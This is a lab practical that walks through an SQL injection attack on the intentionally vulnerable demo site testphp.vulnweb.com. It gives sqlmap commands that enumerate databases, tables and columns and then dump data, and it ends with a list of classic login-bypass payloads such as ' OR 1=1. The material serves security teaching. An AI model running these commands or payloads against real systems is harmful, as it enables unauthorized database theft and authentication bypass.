
---
# **Performing an SQL Injection Attack on testphp.vulnweb.com Using Kali Linux**

## Objective
The objective of this practical is to perform an SQL injection attack on the testphp.vulnweb.com website using tools available on Kali Linux. This will help you understand the process of identifying and exploiting SQL injection vulnerabilities.

## Pre-requisites
1. **Kali Linux**: Ensure you have Kali Linux installed and running.
2. **SQLmap**: Ensure SQLmap is installed on your system. SQLmap is a popular tool for automating the process of detecting and exploiting SQL injection flaws.
3. **Web Browser**: Have a web browser installed to interact with the target website.
4. **Target Website**: Ensure the target website (testphp.vulnweb.com) is accessible from your Kali Linux machine.

## Commands as Steps

1. **Open a Web Browser and Access the Target Website**
   ```bash
   firefox http://testphp.vulnweb.com
   ```
   **Explanation**: Open Firefox and navigate to the target website to familiarize yourself with its structure and functionality.

2. **Identify Potential SQL Injection Points**
   ```bash
   sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch
   ```
   **Explanation**: Use SQLmap to test for SQL injection vulnerabilities in the URL parameter `artist`. The `--batch` option allows SQLmap to run in non-interactive mode, automatically accepting default options.

3. **Enumerate the Database**
   ```bash
   sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
   ```
   **Explanation**: Use SQLmap to enumerate the databases on the target server. The `--dbs` option tells SQLmap to list all databases.

4. **Enumerate the Tables in a Specific Database**
   ```bash
   sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D <database_name> --tables
   ```
   **Explanation**: Replace `<database_name>` with the name of the database you want to enumerate. The `--tables` option lists all tables in the specified database.

5. **Enumerate the Columns in a Specific Table**
   ```bash
   sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D <database_name> -T <table_name> --columns
   ```
   **Explanation**: Replace `<database_name>` with the name of the database and `<table_name>` with the name of the table. The `--columns` option lists all columns in the specified table.

6. **Dump Data from a Specific Table**
   ```bash
   sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D <database_name> -T <table_name> --dump
   ```
   **Explanation**: Replace `<database_name>` with the name of the database and `<table_name>` with the name of the table. The `--dump` option extracts and displays the data from the specified table.

## Additional Notes
- **Ethical Considerations**: Ensure you have explicit permission to test the target website. Unauthorized testing is illegal and unethical.
- **SQLmap Options**: SQLmap has many options and can be customized to suit your needs. Refer to the SQLmap manual (`sqlmap -h`) for more details.
- **Logging**: It's a good practice to log the output of SQLmap commands for future reference and analysis.

' OR 'a'='a
' OR 1=1
" OR "x"="x
' OR <condition TRUE>
' OR condition -- 
' OR '1'='1' --
' OR 1=1 #